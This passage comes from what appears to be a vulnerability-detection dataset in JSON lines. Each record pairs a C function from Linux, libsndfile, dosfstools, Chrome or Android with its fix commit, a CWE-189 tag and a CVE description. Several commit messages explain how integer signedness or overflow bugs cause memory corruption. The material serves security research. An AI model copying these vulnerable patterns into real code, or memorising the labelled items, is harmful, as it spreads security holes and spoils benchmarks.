(psrch_inf->smallBuf)\n\t\t\t\tcifs_small_buf_release(\n\t\t\t\t\tpsrch_inf->ntwrk_buf_start);\n\t\t\telse\n\t\t\t\tcifs_buf_release(psrch_inf->ntwrk_buf_start);\n\t\t\tpsrch_inf->srch_entries_start = response_data;\n\t\t\tpsrch_inf->ntwrk_buf_start = (char *)pSMB;\n\t\t\tpsrch_inf->smallBuf = 0;\n\t\t\tif (parms->EndofSearch)\n\t\t\t\tpsrch_inf->endOfSearch = true;\n\t\t\telse\n\t\t\t\tpsrch_inf->endOfSearch = false;\n\t\t\tpsrch_inf->entries_in_buffer =\n\t\t\t\t\t\tle16_to_cpu(parms->SearchCount);\n\t\t\tpsrch_inf->index_of_last_entry +=\n\t\t\t\tpsrch_inf->entries_in_buffer;\n\t\t\tlnoff = le16_to_cpu(parms->LastNameOffset);\n\t\t\tif (tcon->ses->server->maxBuf - MAX_CIFS_HDR_SIZE <\n\t\t\t      lnoff) {\n\t\t\t\tcERROR(1, \"ignoring corrupt resume name\");\n\t\t\t\tpsrch_inf->last_entry = NULL;\n\t\t\t\treturn rc;\n\t\t\t} else\n\t\t\t\tpsrch_inf->last_entry =\n\t\t\t\t\tpsrch_inf->srch_entries_start + lnoff;\n\n/*  cFYI(1, \"fnxt2 entries in buf %d index_of_last %d\",\n\t    psrch_inf->entries_in_buffer, psrch_inf->index_of_last_entry); */\n\n\t\t\t/* BB fixme add unlock here */\n\t\t}\n\n\t}\n\n\t/* BB On error, should we leave previous search buf (and count and\n\tlast entry fields) intact or free the previous one? */\n\n\t/* Note: On -EAGAIN error only caller can retry on handle based calls\n\tsince file handle passed in no longer valid */\nFNext2_err_exit:\n\tif (rc != 0)\n\t\tcifs_buf_release(pSMB);\n\treturn rc;\n}\n", "func_hash": 199510093665953183137441330965789355440, "file_name": "cifssmb.c", "file_hash": 26433589528345729127329209952904704679, "cwe": ["CWE-189"], "cve": "CVE-2011-3191", "cve_desc": "Integer signedness error in the CIFSFindNext function in fs/cifs/cifssmb.c in the Linux kernel before 3.1 allows remote CIFS servers to cause a denial of service (memory corruption) or possibly have unspecified other impact via a large length value in a response to a read request for a directory.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-3191"}
{"idx": 184366, "project": "linux", "commit_id": "b5b515445f4f5a905c5dd27e6e682868ccd6c09d", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/b5b515445f4f5a905c5dd27e6e682868ccd6c09d", "commit_message": "[SCSI] pmcraid: reject negative request size\n\nThere's a code path in pmcraid that can be reached via device ioctl that\ncauses all sorts of ugliness, including heap corruption or triggering the\nOOM killer due to consecutive allocation of large numbers of pages.\n\nFirst, the user can call pmcraid_chr_ioctl(), with a type\nPMCRAID_PASSTHROUGH_IOCTL.  This calls through to\npmcraid_ioctl_passthrough().  Next, a pmcraid_passthrough_ioctl_buffer\nis copied in, and the request_size variable is set to\nbuffer->ioarcb.data_transfer_length, which is an arbitrary 32-bit\nsigned value provided by the user.  If a negative value is provided\nhere, bad things can happen.  For example,\npmcraid_build_passthrough_ioadls() is called with this request_size,\nwhich immediately calls pmcraid_alloc_sglist() with a negative size.\nThe resulting math on allocating a scatter list can result in an\noverflow in the kzalloc() call (if num_elem is 0, the sglist will be\nsmaller than expected), or if num_elem is unexpectedly large the\nsubsequent loop will call alloc_pages() repeatedly, a high number of\npages will be allocated and the OOM killer might be invoked.\n\nIt looks like preventing this value from being negative in\npmcraid_ioctl_passthrough() would be sufficient.\n\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com>\nCc: <stable@kernel.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: James Bottomley <JBottomley@Parallels.com>", "target": 0, "func": "static long pmcraid_ioctl_passthrough(\n\tstruct pmcraid_instance *pinstance,\n\tunsigned int ioctl_cmd,\n\tunsigned int buflen,\n\tunsigned long arg\n)\n{\n\tstruct pmcraid_passthrough_ioctl_buffer *buffer;\n\tstruct pmcraid_ioarcb *ioarcb;\n\tstruct pmcraid_cmd *cmd;\n\tstruct pmcraid_cmd *cancel_cmd;\n\tunsigned long request_buffer;\n\tunsigned long request_offset;\n\tunsigned long lock_flags;\n\tvoid *ioasa;\n\tu32 ioasc;\n\tint request_size;\n\tint buffer_size;\n\tu8 access, direction;\n\tint rc = 0;\n\n\t/* If IOA reset is in progress, wait 10 secs for reset to complete */\n\tif (pinstance->ioa_reset_in_progress) {\n\t\trc = wait_event_interruptible_timeout(\n\t\t\t\tpinstance->reset_wait_q,\n\t\t\t\t!pinstance->ioa_reset_in_progress,\n\t\t\t\tmsecs_to_jiffies(10000));\n\n\t\tif (!rc)\n\t\t\treturn -ETIMEDOUT;\n\t\telse if (rc < 0)\n\t\t\treturn -ERESTARTSYS;\n\t}\n\n\t/* If adapter is not in operational state, return error */\n\tif (pinstance->ioa_state != IOA_STATE_OPERATIONAL) {\n\t\tpmcraid_err(\"IOA is not operational\\n\");\n\t\treturn -ENOTTY;\n\t}\n\n\tbuffer_size = sizeof(struct pmcraid_passthrough_ioctl_buffer);\n\tbuffer = kmalloc(buffer_size, GFP_KERNEL);\n\n\tif (!buffer) {\n\t\tpmcraid_err(\"no memory for passthrough buffer\\n\");\n\t\treturn -ENOMEM;\n\t}\n\n\trequest_offset =\n\t    offsetof(struct pmcraid_passthrough_ioctl_buffer, request_buffer);\n\n\trequest_buffer = arg + request_offset;\n\n\trc = __copy_from_user(buffer,\n\t\t\t     (struct pmcraid_passthrough_ioctl_buffer *) arg,\n\t\t\t     sizeof(struct pmcraid_passthrough_ioctl_buffer));\n\n\tioasa =\n\t(void *)(arg +\n\t\toffsetof(struct pmcraid_passthrough_ioctl_buffer, ioasa));\n\n\tif (rc) {\n\t\tpmcraid_err(\"ioctl: can't copy passthrough buffer\\n\");\n\t\trc = -EFAULT;\n\t\tgoto out_free_buffer;\n\t}\n\n\trequest_size = buffer->ioarcb.data_transfer_length;\n\n\tif (buffer->ioarcb.request_flags0 & TRANSFER_DIR_WRITE) {\n\t\taccess = VERIFY_READ;\n\t\tdirection = DMA_TO_DEVICE;\n\t} else {\n\t\taccess = VERIFY_WRITE;\n\t\tdirection = DMA_FROM_DEVICE;\n\t}\n\n\tif (request_size > 0) {\n\t\trc = access_ok(access, arg, request_offset + request_size);\n\n\t\tif (!rc) {\n\t\t\trc = -EFAULT;\n\t\t\tgoto out_free_buffer;\n\t\t}\n\t} else if (request_size < 0) {\n\t\trc = -EINVAL;\n\t\tgoto out_free_buffer;\n\t}\n\n\t/* check if we have any additional command parameters */\n\tif (buffer->ioarcb.add_cmd_param_length > PMCRAID_ADD_CMD_PARAM_LEN) {\n\t\trc = -EINVAL;\n\t\tgoto out_free_buffer;\n\t}\n\n\tcmd = pmcraid_get_free_cmd(pinstance);\n\n\tif (!cmd) {\n\t\tpmcraid_err(\"free command block is not available\\n\");\n\t\trc = -ENOMEM;\n\t\tgoto out_free_buffer;\n\t}\n\n\tcmd->scsi_cmd = NULL;\n\tioarcb = &(cmd->ioa_cb->ioarcb);\n\n\t/* Copy the user-provided IOARCB stuff field by field */\n\tioarcb->resource_handle = buffer->ioarcb.resource_handle;\n\tioarcb->data_transfer_length = buffer->ioarcb.data_transfer_length;\n\tioarcb->cmd_timeout = buffer->ioarcb.cmd_timeout;\n\tioarcb->request_type = buffer->ioarcb.request_type;\n\tioarcb->request_flags0 = buffer->ioarcb.request_flags0;\n\tioarcb->request_flags1 = buffer->ioarcb.request_flags1;\n\tmemcpy(ioarcb->cdb, buffer->ioarcb.cdb, PMCRAID_MAX_CDB_LEN);\n\n\tif (buffer->ioarcb.add_cmd_param_length) {\n\t\tioarcb->add_cmd_param_length =\n\t\t\tbuffer->ioarcb.add_cmd_param_length;\n\t\tioarcb->add_cmd_param_offset =\n\t\t\tbuffer->ioarcb.add_cmd_param_offset;\n\t\tmemcpy(ioarcb->add_data.u.add_cmd_params,\n\t\t\tbuffer->ioarcb.add_data.u.add_cmd_params,\n\t\t\tbuffer->ioarcb.add_cmd_param_length);\n\t}\n\n\t/* set hrrq number where the IOA should respond to. Note that all cmds\n\t * generated internally uses hrrq_id 0, exception to this is the cmd\n\t * block of scsi_cmd which is re-used (e.g. cancel/abort), which uses\n\t * hrrq_id assigned here in queuecommand\n\t */\n\tioarcb->hrrq_id = atomic_add_return(1, &(pinstance->last_message_id)) %\n\t\t\t  pinstance->num_hrrq;\n\n\tif (request_size) {\n\t\trc = pmcraid_build_passthrough_ioadls(cmd,\n\t\t\t\t\t\t      request_size,\n\t\t\t\t\t\t      direction);\n\t\tif (rc) {\n \t\t\tpmcraid_err(\"couldn't build passthrough ioadls\\n\");\n \t\t\tgoto out_free_buffer;\n \t\t}\n\t} else if (request_size < 0) {\n\t\trc = -EINVAL;\n\t\tgoto out_free_buffer;\n \t}\n \n \t/* If data is being written into the device, copy the data from user\n\t * buffers\n\t */\n\tif (direction == DMA_TO_DEVICE && request_size > 0) {\n\t\trc = pmcraid_copy_sglist(cmd->sglist,\n\t\t\t\t\t request_buffer,\n\t\t\t\t\t request_size,\n\t\t\t\t\t direction);\n\t\tif (rc) {\n\t\t\tpmcraid_err(\"failed to copy user buffer\\n\");\n\t\t\tgoto out_free_sglist;\n\t\t}\n\t}\n\n\t/* passthrough ioctl is a blocking command so, put the user to sleep\n\t * until timeout. Note that a timeout value of 0 means, do timeout.\n\t */\n\tcmd->cmd_done = pmcraid_internal_done;\n\tinit_completion(&cmd->wait_for_completion);\n\tcmd->completion_req = 1;\n\n\tpmcraid_info(\"command(%d) (CDB[0] = %x) for %x\\n\",\n\t\t     le32_to_cpu(cmd->ioa_cb->ioarcb.response_handle) >> 2,\n\t\t     cmd->ioa_cb->ioarcb.cdb[0],\n\t\t     le32_to_cpu(cmd->ioa_cb->ioarcb.resource_handle));\n\n\tspin_lock_irqsave(pinstance->host->host_lock, lock_flags);\n\t_pmcraid_fire_command(cmd);\n\tspin_unlock_irqrestore(pinstance->host->host_lock, lock_flags);\n\n\t/* NOTE ! Remove the below line once abort_task is implemented\n\t * in firmware. This line disables ioctl command timeout handling logic\n\t * similar to IO command timeout handling, making ioctl commands to wait\n\t * until the command completion regardless of timeout value specified in\n\t * ioarcb\n\t */\n\tbuffer->ioarcb.cmd_timeout = 0;\n\n\t/* If command timeout is specified put caller to wait till that time,\n\t * otherwise it would be blocking wait. If command gets timed out, it\n\t * will be aborted.\n\t */\n\tif (buffer->ioarcb.cmd_timeout == 0) {\n\t\twait_for_completion(&cmd->wait_for_completion);\n\t} else if (!wait_for_completion_timeout(\n\t\t\t&cmd->wait_for_completion,\n\t\t\tmsecs_to_jiffies(buffer->ioarcb.cmd_timeout * 1000))) {\n\n\t\tpmcraid_info(\"aborting cmd %d (CDB[0] = %x) due to timeout\\n\",\n\t\t\tle32_to_cpu(cmd->ioa_cb->ioarcb.response_handle >> 2),\n\t\t\tcmd->ioa_cb->ioarcb.cdb[0]);\n\n\t\tspin_lock_irqsave(pinstance->host->host_lock, lock_flags);\n\t\tcancel_cmd = pmcraid_abort_cmd(cmd);\n\t\tspin_unlock_irqrestore(pinstance->host->host_lock, lock_flags);\n\n\t\tif (cancel_cmd) {\n\t\t\twait_for_completion(&cancel_cmd->wait_for_completion);\n\t\t\tioasc = cancel_cmd->ioa_cb->ioasa.ioasc;\n\t\t\tpmcraid_return_cmd(cancel_cmd);\n\n\t\t\t/* if abort task couldn't find the command i.e it got\n\t\t\t * completed prior to aborting, return good completion.\n\t\t\t * if command got aborted successfully or there was IOA\n\t\t\t * reset due to abort task itself getting timedout then\n\t\t\t * return -ETIMEDOUT\n\t\t\t */\n\t\t\tif (ioasc == PMCRAID_IOASC_IOA_WAS_RESET ||\n\t\t\t    PMCRAID_IOASC_SENSE_KEY(ioasc) == 0x00) {\n\t\t\t\tif (ioasc != PMCRAID_IOASC_GC_IOARCB_NOTFOUND)\n\t\t\t\t\trc = -ETIMEDOUT;\n\t\t\t\tgoto out_handle_response;\n\t\t\t}\n\t\t}\n\n\t\t/* no command block for abort task or abort task failed to abort\n\t\t * the IOARCB, then wait for 150 more seconds and initiate reset\n\t\t * sequence after timeout\n\t\t */\n\t\tif (!wait_for_completion_timeout(\n\t\t\t&cmd->wait_for_completion,\n\t\t\tmsecs_to_jiffies(150 * 1000))) {\n\t\t\tpmcraid_reset_bringup(cmd->drv_inst);\n\t\t\trc = -ETIMEDOUT;\n\t\t}\n\t}\n\nout_handle_response:\n\t/* copy entire IOASA buffer and return IOCTL success.\n\t * If copying IOASA to user-buffer fails, return\n\t * EFAULT\n\t */\n\tif (copy_to_user(ioasa, &cmd->ioa_cb->ioasa,\n\t\tsizeof(struct pmcraid_ioasa))) {\n\t\tpmcraid_err(\"failed to copy ioasa buffer to user\\n\");\n\t\trc = -EFAULT;\n\t}\n\n\t/* If the data transfer was from device, copy the data onto user\n\t * buffers\n\t */\n\telse if (direction == DMA_FROM_DEVICE && request_size > 0) {\n\t\trc = pmcraid_copy_sglist(cmd->sglist,\n\t\t\t\t\t request_buffer,\n\t\t\t\t\t request_size,\n\t\t\t\t\t direction);\n\t\tif (rc) {\n\t\t\tpmcraid_err(\"failed to copy user buffer\\n\");\n\t\t\trc = -EFAULT;\n\t\t}\n\t}\n\nout_free_sglist:\n\tpmcraid_release_passthrough_ioadls(cmd, request_size, direction);\n\tpmcraid_return_cmd(cmd);\n\nout_free_buffer:\n\tkfree(buffer);\n\n\treturn rc;\n}\n", "func_hash": 82163326830447769756885920491727513617, "file_name": "pmcraid.c", "file_hash": 5320847727715775618270750353598115908, "cwe": ["CWE-189"], "cve": "CVE-2011-2906", "cve_desc": "Integer signedness error in the pmcraid_ioctl_passthrough function in drivers/scsi/pmcraid.c in the Linux kernel before 3.1 might allow local users to cause a denial of service (memory consumption or memory corruption) via a negative size value in an ioctl call. NOTE: this may be a vulnerability only in unusual environments that provide a privileged program for obtaining the required file descriptor.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-2906"}
{"idx": 184370, "project": "linux", "commit_id": "982134ba62618c2d69fbbbd166d0a11ee3b7e3d8", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/982134ba62618c2d69fbbbd166d0a11ee3b7e3d8", "commit_message": "mm: avoid wrapping vm_pgoff in mremap()\n\nThe normal mmap paths all avoid creating a mapping where the pgoff\ninside the mapping could wrap around due to overflow.  However, an\nexpanding mremap() can take such a non-wrapping mapping and make it\nbigger and cause a wrapping condition.\n\nNoticed by Robert Swiecki when running a system call fuzzer, where it\ncaused a BUG_ON() due to terminally confusing the vma_prio_tree code.  A\nvma dumping patch by Hugh then pinpointed the crazy wrapped case.\n\nReported-and-tested-by: Robert Swiecki <robert@swiecki.net>\nAcked-by: Hugh Dickins <hughd@google.com>\nCc: stable@kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>", "target": 0, "func": "static struct vm_area_struct *vma_to_resize(unsigned long addr,\n\tunsigned long old_len, unsigned long new_len, unsigned long *p)\n{\n\tstruct mm_struct *mm = current->mm;\n\tstruct vm_area_struct *vma = find_vma(mm, addr);\n\n\tif (!vma || vma->vm_start > addr)\n\t\tgoto Efault;\n\n\tif (is_vm_hugetlb_page(vma))\n\t\tgoto Einval;\n\n\t/* We can't remap across vm area boundaries */\n \tif (old_len > vma->vm_end - addr)\n \t\tgoto Efault;\n \n\t/* Need to be careful about a growing mapping */\n\tif (new_len > old_len) {\n\t\tunsigned long pgoff;\n\n\t\tif (vma->vm_flags & (VM_DONTEXPAND | VM_PFNMAP))\n \t\t\tgoto Efault;\n\t\tpgoff = (addr - vma->vm_start) >> PAGE_SHIFT;\n\t\tpgoff += vma->vm_pgoff;\n\t\tif (pgoff + (new_len >> PAGE_SHIFT) < pgoff)\n\t\t\tgoto Einval;\n \t}\n \n \tif (vma->vm_flags & VM_LOCKED) {\n\t\tunsigned long locked, lock_limit;\n\t\tlocked = mm->locked_vm << PAGE_SHIFT;\n\t\tlock_limit = rlimit(RLIMIT_MEMLOCK);\n\t\tlocked += new_len - old_len;\n\t\tif (locked > lock_limit && !capable(CAP_IPC_LOCK))\n\t\t\tgoto Eagain;\n\t}\n\n\tif (!may_expand_vm(mm, (new_len - old_len) >> PAGE_SHIFT))\n\t\tgoto Enomem;\n\n\tif (vma->vm_flags & VM_ACCOUNT) {\n\t\tunsigned long charged = (new_len - old_len) >> PAGE_SHIFT;\n\t\tif (security_vm_enough_memory(charged))\n\t\t\tgoto Efault;\n\t\t*p = charged;\n\t}\n\n\treturn vma;\n\nEfault:\t/* very odd choice for most of the cases, but... */\n\treturn ERR_PTR(-EFAULT);\nEinval:\n\treturn ERR_PTR(-EINVAL);\nEnomem:\n\treturn ERR_PTR(-ENOMEM);\nEagain:\n\treturn ERR_PTR(-EAGAIN);\n}\n", "func_hash": 156075716194415668087145794571082904074, "file_name": "mremap.c", "file_hash": 191286780299224623789483530836749571575, "cwe": ["CWE-189"], "cve": "CVE-2011-2496", "cve_desc": "Integer overflow in the vma_to_resize function in mm/mremap.c in the Linux kernel before 2.6.39 allows local users to cause a denial of service (BUG_ON and system crash) via a crafted mremap system call that expands a memory mapping.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-2496"}
{"idx": 44278, "project": "libsndfile", "commit_id": "725c7dbb95bfaf8b4bb7b04820e3a00cceea9ce6", "project_url": "https://github.com/erikd/libsndfile", "commit_url": "https://github.com/erikd/libsndfile/commit/725c7dbb95bfaf8b4bb7b04820e3a00cceea9ce6", "commit_message": "src/file_io.c : Prevent potential divide-by-zero.\n\nCloses: https://github.com/erikd/libsndfile/issues/92", "target": 0, "func": "psf_fwrite (const void *ptr, sf_count_t bytes, sf_count_t items, SF_PRIVATE *psf)\n{\tsf_count_t total = 0 ;\n\tssize_t\tcount ;\n\n\tif (psf->virtual_io)\n\t\treturn psf->vio.write (ptr, bytes*items, psf->vio_user_data) / bytes ;\n\n\titems *= bytes ;\n\n\t/* Do this check after the multiplication above. */\n\tif (items <= 0)\n\t\treturn 0 ;\n\n\twhile (items > 0)\n\t{\t/* Break the writes down to a sensible size. */\n\t\tcount = (items > SENSIBLE_SIZE) ? SENSIBLE_SIZE : items ;\n\n\t\tcount = write (psf->file.filedes, ((const char*) ptr) + total, count) ;\n\n\t\tif (count == -1)\n\t\t{\tif (errno == EINTR)\n\t\t\t\tcontinue ;\n\n\t\t\tpsf_log_syserr (psf, errno) ;\n\t\t\tbreak ;\n\t\t\t} ;\n\n\t\tif (count == 0)\n\t\t\tbreak ;\n\n\t\ttotal += count ;\n\t\titems -= count ;\n\t\t} ;\n\n\treturn total / bytes ;\n} /* psf_fwrite */\n", "func_hash": 300658478914303180689662660657494997220, "file_name": "file_io.c", "file_hash": 207124311700953691198999422851135970057, "cwe": ["CWE-189"], "cve": "CVE-2014-9756", "cve_desc": "The psf_fwrite function in file_io.c in libsndfile allows attackers to cause a denial of service (divide-by-zero error and application crash) via unspecified vectors related to the headindex variable.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-9756"}
{"idx": 184494, "project": "dosfstools", "commit_id": "07908124838afcc99c577d1d3e84cef2dbd39cb7", "project_url": "https://github.com/dosfstools/dosfstools", "commit_url": "https://github.com/dosfstools/dosfstools/commit/07908124838afcc99c577d1d3e84cef2dbd39cb7", "commit_message": "set_fat(): Fix off-by-2 error leading to corruption in FAT12\n\nIn FAT12 two 12 bit entries are combined to a 24 bit value (three\nbytes). Therefore, when an even numbered FAT entry is set in FAT12, it\nmust be be combined with the following entry. To prevent accessing\nbeyond the end of the FAT array, it must be checked that the cluster is\nnot the last one.\n\nPreviously, the check tested that the requested cluster was equal to\nfs->clusters - 1. However, fs->clusters is the number of data clusters\nnot including the two reserved FAT entries at the start so the test\ntriggered two clusters early.\n\nIf the third to last entry was written on a FAT12 filesystem with an\nodd number of clusters, the second to last entry would be corrupted.\nThis corruption may also lead to invalid memory accesses when the\ncorrupted entry becomes out of bounds and is used later.\n\nChange the test to fs->clusters + 1 to fix.\n\nReported-by: Hanno Bck\nSigned-off-by: Andreas Bombe <aeb@debian.org>", "target": 0, "func": "void set_fat(DOS_FS * fs, uint32_t cluster, int32_t new)\n{\n    unsigned char *data = NULL;\n    int size;\n    loff_t offs;\n\n    if (new == -1)\n\tnew = FAT_EOF(fs);\n    else if ((long)new == -2)\n\tnew = FAT_BAD(fs);\n    switch (fs->fat_bits) {\n    case 12:\n\tdata = fs->fat + cluster * 3 / 2;\n\toffs = fs->fat_start + cluster * 3 / 2;\n\tif (cluster & 1) {\n\t    FAT_ENTRY prevEntry;\n\t    get_fat(&prevEntry, fs->fat, cluster - 1, fs);\n\t    data[0] = ((new & 0xf) << 4) | (prevEntry.value >> 8);\n \t    data[1] = new >> 4;\n \t} else {\n \t    FAT_ENTRY subseqEntry;\n\t    if (cluster != fs->clusters + 1)\n \t\tget_fat(&subseqEntry, fs->fat, cluster + 1, fs);\n \t    else\n \t\tsubseqEntry.value = 0;\n\t    data[0] = new & 0xff;\n\t    data[1] = (new >> 8) | ((0xff & subseqEntry.value) << 4);\n\t}\n\tsize = 2;\n\tbreak;\n    case 16:\n\tdata = fs->fat + cluster * 2;\n\toffs = fs->fat_start + cluster * 2;\n\t*(unsigned short *)data = htole16(new);\n\tsize = 2;\n\tbreak;\n    case 32:\n\t{\n\t    FAT_ENTRY curEntry;\n\t    get_fat(&curEntry, fs->fat, cluster, fs);\n\n\t    data = fs->fat + cluster * 4;\n\t    offs = fs->fat_start + cluster * 4;\n\t    /* According to M$, the high 4 bits of a FAT32 entry are reserved and\n\t     * are not part of the cluster number. So we never touch them. */\n\t    *(uint32_t *)data = htole32((new & 0xfffffff) |\n\t\t\t\t\t     (curEntry.reserved << 28));\n\t    size = 4;\n\t}\n\tbreak;\n    default:\n\tdie(\"Bad FAT entry size: %d bits.\", fs->fat_bits);\n    }\n    fs_write(offs, size, data);\n    if (fs->nfats > 1) {\n\tfs_write(offs + fs->fat_size, size, data);\n    }\n}\n", "func_hash": 208429240369048852614438814656211303800, "file_name": "fat.c", "file_hash": 258057985473446598986931599029975037090, "cwe": ["CWE-189"], "cve": "CVE-2015-8872", "cve_desc": "The set_fat function in fat.c in dosfstools before 4.0 might allow attackers to corrupt a FAT12 filesystem or cause a denial of service (invalid memory read and crash) by writing an odd number of clusters to the third to last entry on a FAT12 filesystem, which triggers an \"off-by-two error.\"", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-8872"}
{"idx": 184951, "project": "Chrome", "commit_id": "b2006ac87cec58363090e7d5e10d5d9e3bbda9f9", "project_url": "https://github.com/chromium/chromium", "commit_url": "https://github.com/chromium/chromium/commit/b2006ac87cec58363090e7d5e10d5d9e3bbda9f9", "commit_message": "None", "target": 0, "func": "static bool CheckMov(const uint8* buffer, int buffer_size) {\n  RCHECK(buffer_size > 8);\n \n   int offset = 0;\n   while (offset + 8 < buffer_size) {\n    uint32 atomsize = Read32(buffer + offset);\n     uint32 atomtype = Read32(buffer + offset + 4);\n     switch (atomtype) {\n      case TAG('f','t','y','p'):\n      case TAG('p','d','i','n'):\n      case TAG('m','o','o','v'):\n      case TAG('m','o','o','f'):\n      case TAG('m','f','r','a'):\n      case TAG('m','d','a','t'):\n      case TAG('f','r','e','e'):\n      case TAG('s','k','i','p'):\n      case TAG('m','e','t','a'):\n      case TAG('m','e','c','o'):\n      case TAG('s','t','y','p'):\n      case TAG('s','i','d','x'):\n      case TAG('s','s','i','x'):\n      case TAG('p','r','f','t'):\n      case TAG('b','l','o','c'):\n        break;\n      default:\n        return false;\n    }\n    if (atomsize == 1) {\n      if (offset + 16 > buffer_size)\n        break;\n      if (Read32(buffer + offset + 8) != 0)\n         break;  // Offset is way past buffer size.\n       atomsize = Read32(buffer + offset + 12);\n     }\n    if (atomsize == 0 || atomsize > static_cast<size_t>(buffer_size))\n       break;  // Indicates the last atom or length too big.\n     offset += atomsize;\n   }\n  return true;\n}\n", "func_hash": 96388809046961005338503697596106553292, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2014-7908", "cve_desc": "Multiple integer overflows in the CheckMov function in media/base/container_names.cc in Google Chrome before 39.0.2171.65 allow remote attackers to cause a denial of service or possibly have unspecified other impact via a large atom in (1) MPEG-4 or (2) QuickTime .mov data.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-7908"}
{"idx": 185163, "project": "Android", "commit_id": "6fe85f7e15203e48df2cc3e8e1c4bc6ad49dc968", "project_url": "None", "commit_url": "https://android.googlesource.com/platform/frameworks/av/+/6fe85f7e15203e48df2cc3e8e1c4bc6ad49dc968", "commit_message": "None", "target": 0, "func": "status_t MPEG4Extractor::parseChunk(off64_t *offset, int depth) {\n    ALOGV(\"entering parseChunk %lld/%d\", *offset, depth);\n uint32_t hdr[2];\n if (mDataSource->readAt(*offset, hdr, 8) < 8) {\n return ERROR_IO;\n }\n uint64_t chunk_size = ntohl(hdr[0]);\n uint32_t chunk_type = ntohl(hdr[1]);\n off64_t data_offset = *offset + 8;\n\n if (chunk_size == 1) {\n if (mDataSource->readAt(*offset + 8, &chunk_size, 8) < 8) {\n return ERROR_IO;\n }\n        chunk_size = ntoh64(chunk_size);\n        data_offset += 8;\n\n if (chunk_size < 16) {\n return ERROR_MALFORMED;\n }\n } else if (chunk_size == 0) {\n if (depth == 0) {\n off64_t sourceSize;\n if (mDataSource->getSize(&sourceSize) == OK) {\n                chunk_size = (sourceSize - *offset);\n } else {\n                ALOGE(\"atom size is 0, and data source has no size\");\n return ERROR_MALFORMED;\n }\n } else {\n *offset += 4;\n return OK;\n }\n } else if (chunk_size < 8) {\n        ALOGE(\"invalid chunk size: %\" PRIu64, chunk_size);\n return ERROR_MALFORMED;\n }\n\n char chunk[5];\n MakeFourCCString(chunk_type, chunk);\n    ALOGV(\"chunk: %s @ %lld, %d\", chunk, *offset, depth);\n\n#if 0\n static const char kWhitespace[] = \"                                        \";\n const char *indent = &kWhitespace[sizeof(kWhitespace) - 1 - 2 * depth];\n    printf(\"%sfound chunk '%s' of size %\" PRIu64 \"\\n\", indent, chunk, chunk_size);\n\n char buffer[256];\n size_t n = chunk_size;\n if (n > sizeof(buffer)) {\n        n = sizeof(buffer);\n }\n if (mDataSource->readAt(*offset, buffer, n)\n < (ssize_t)n) {\n return ERROR_IO;\n }\n\n    hexdump(buffer, n);\n#endif\n\n PathAdder autoAdder(&mPath, chunk_type);\n\n off64_t chunk_data_size = *offset + chunk_size - data_offset;\n\n if (chunk_type != FOURCC('c', 'p', 'r', 't')\n && chunk_type != FOURCC('c', 'o', 'v', 'r')\n && mPath.size() == 5 && underMetaDataPath(mPath)) {\n off64_t stop_offset = *offset + chunk_size;\n *offset = data_offset;\n while (*offset < stop_offset) {\n status_t err = parseChunk(offset, depth + 1);\n if (err != OK) {\n return err;\n }\n }\n\n if (*offset != stop_offset) {\n return ERROR_MALFORMED;\n }\n\n return OK;\n }\n\n switch(chunk_type) {\n case FOURCC('m', 'o', 'o', 'v'):\n case FOURCC('t', 'r', 'a', 'k'):\n case FOURCC('m', 'd', 'i', 'a'):\n case FOURCC('m', 'i', 'n', 'f'):\n case FOURCC('d', 'i', 'n', 'f'):\n case FOURCC('s', 't', 'b', 'l'):\n case FOURCC('m', 'v', 'e', 'x'):\n case FOURCC('m', 'o', 'o', 'f'):\n case FOURCC('t', 'r', 'a', 'f'):\n case FOURCC('m', 'f', 'r', 'a'):\n case FOURCC('u', 'd', 't', 'a'):\n case FOURCC('i', 'l', 's', 't'):\n case FOURCC('s', 'i', 'n', 'f'):\n case FOURCC('s', 'c', 'h', 'i'):\n case FOURCC('e', 'd', 't', 's'):\n {\n if (chunk_type == FOURCC('s', 't', 'b', 'l')) {\n                ALOGV(\"sampleTable chunk is %\" PRIu64 \" bytes long.\", chunk_size);\n\n if (mDataSource->flags()\n & (DataSource::kWantsPrefetching\n | DataSource::kIsCachingDataSource)) {\n                    sp<MPEG4DataSource> cachedSource =\n new MPEG4DataSource(mDataSource);\n\n if (cachedSource->setCachedRange(*offset, chunk_size) == OK) {\n                        mDataSource = cachedSource;\n }\n }\n\n                mLastTrack->sampleTable = new SampleTable(mDataSource);\n }\n\n bool isTrack = false;\n if (chunk_type == FOURCC('t', 'r', 'a', 'k')) {\n                isTrack = true;\n\n Track *track = new Track;\n                track->next = NULL;\n if (mLastTrack) {\n                    mLastTrack->next = track;\n } else {\n                    mFirstTrack = track;\n }\n                mLastTrack = track;\n\n                track->meta = new MetaData;\n                track->includes_expensive_metadata = false;\n                track->skipTrack = false;\n                track->timescale = 0;\n                track->meta->setCString(kKeyMIMEType, \"application/octet-stream\");\n }\n\n off64_t stop_offset = *offset + chunk_size;\n *offset = data_offset;\n while (*offset < stop_offset) {\n status_t err = parseChunk(offset, depth + 1);\n if (err != OK) {\n return err;\n }\n }\n\n if (*offset != stop_offset) {\n return ERROR_MALFORMED;\n }\n\n if (isTrack) {\n if (mLastTrack->skipTrack) {\n Track *cur = mFirstTrack;\n\n if (cur == mLastTrack) {\n delete cur;\n                        mFirstTrack = mLastTrack = NULL;\n } else {\n while (cur && cur->next != mLastTrack) {\n                            cur = cur->next;\n }\n                        cur->next = NULL;\n delete mLastTrack;\n                        mLastTrack = cur;\n }\n\n return OK;\n }\n\n status_t err = verifyTrack(mLastTrack);\n\n if (err != OK) {\n return err;\n }\n } else if (chunk_type == FOURCC('m', 'o', 'o', 'v')) {\n                mInitCheck = OK;\n\n if (!mIsDrm) {\n return UNKNOWN_ERROR; // Return a dummy error.\n } else {\n return OK;\n }\n }\n break;\n }\n\n case FOURCC('e', 'l', 's', 't'):\n {\n *offset += chunk_size;\n\n uint8_t version;\n if 